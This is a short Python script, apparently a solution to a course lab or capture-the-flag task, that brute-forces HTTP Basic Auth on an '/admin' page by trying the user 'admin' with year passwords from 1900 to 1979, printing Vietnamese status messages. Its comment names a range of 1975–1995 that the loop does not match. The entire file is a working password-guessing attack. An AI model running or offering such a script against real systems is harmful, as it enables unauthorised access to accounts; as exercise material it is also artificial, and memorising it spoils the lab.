import requests
from requests.auth import HTTPBasicAuth

url = 'https://6bf7e033-4b12-456f-a1cb-3e6b70d58891-web.web.lms.itmo.xyz/admin'

# Thử các năm từ 1975 đến 1995
for year in range(1900, 1980):
    response = requests.get(url, auth=HTTPBasicAuth('admin', str(year)))
    if response.status_code == 200:
        print(f"Đăng nhập thành công với mật khẩu: {year}")
        break
    else:
        print(f"Thử {year}: không thành công")
